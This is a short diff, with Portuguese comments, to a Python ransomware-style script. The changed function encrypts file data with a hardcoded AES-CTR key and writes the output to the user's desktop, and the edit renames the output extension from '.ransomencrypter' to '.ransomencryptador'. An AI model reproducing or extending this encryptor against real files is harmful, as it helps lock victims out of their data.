@@ -42,8 +42,7 @@ def criptografando():
             key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
             aes = pyaes.AESModeOfOperationCTR(key)  # gera a criptografia
             crypto_data = aes.encrypt(file_data)
-            # Salvando arquivo novo (.ransomencrypter)
-            new_file = format_file + ".ransomencrypter"
+            new_file = format_file + ".ransomencryptador"
             new_file = open(f'{desktop}\\{new_file}', 'wb')
             new_file.write(crypto_data)
             new_file.close()
